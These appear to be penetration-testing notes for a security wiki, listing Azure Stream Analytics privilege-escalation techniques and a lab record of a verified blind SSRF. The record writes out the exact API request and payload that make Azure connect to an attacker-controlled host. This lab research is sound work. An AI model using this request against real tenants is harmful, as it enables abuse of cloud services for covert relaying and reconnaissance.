# Stream Analytics — Tests Done

Wiki: `az-stream-analytics-*` (privesc/post).

| # | Technique | Min perms | Status |
|---|-----------|-----------|--------|
| 1 | `streamingjobs/Write` full-job rewrite + MI attach | that action | DOC-ONLY |
| 2 | `inputs/Write` MSI confused-deputy read | that action | DOC-ONLY |
| 3 | `functions/Write` Azure ML UDF endpoint repoint (exfil/SSRF) — JS/C# UDFs sandboxed = NO RCE | that action | DOC-ONLY |
| 4 | `locations/SampleInput/action` job-less egress/cred-validation proxy (low-priv Query Tester role) | that action | DOC-ONLY |
| 5 | `functions/RetrieveDefaultDefinition/action` job-less server-side SSRF | `streamingjobs/functions/RetrieveDefaultDefinition/action` | **WORKS — lab-verified 2026-09-25** |

Notes: `transformations/RetrieveDefaultDefinition`, scale — peripheral.

**Lab record (test #5, 2026-09-25 — RetrieveDefaultDefinition SSRF):** RG `htrc-sassrf` (eastus). Stood up a B1s VM
`htlsnr` (public IP `20.102.78.68`) running a raw-TCP logger on :80/:443, opened the NSG, and created a **stopped**
SA job `htsajob` (`jobState: Created`, no SUs). Called
`POST .../streamingjobs/htsajob/functions/htfn/RetrieveDefaultDefinition?api-version=2020-03-01` with
`{"bindingType":"Microsoft.MachineLearningServices","bindingRetrievalProperties":{"endpoint":"https://20.102.78.68/<marker>","udfType":"Scalar"}}`.
The SA service **opened a TLS connection to our arbitrary URL** — listener logged two ClientHellos from
**`57.152.104.107`** (block `57.152.0.0/16`, RIPE registrant `MICROSOFT-MAINT`, i.e. Microsoft/Azure), each within the
same second as a call, and never from our own egress IP (`81.33.68.197`). Constraints found: **http rejected** (`Only Uri
scheme : 'https' is supported`); the **classic `Microsoft.MachineLearning/WebService` binding is host-allowlisted to
`services.azureml.net`** (SSRF blocked) — only `Microsoft.MachineLearningServices` accepts an arbitrary host. Job-less, no
job MI token on the request = blind SSRF relay from Microsoft IP space. Wiki: added a lab-verified `> [!TIP]` under the
ML-UDF section of `az-stream-analytics-privesc.md` (upgrading the prior "unconfirmed" NOTE and correcting the classic-binding
assumption). **Teardown:** `az group delete htrc-sassrf`. Cost: VM+job ran <15 min, well under the $5/30min gate.
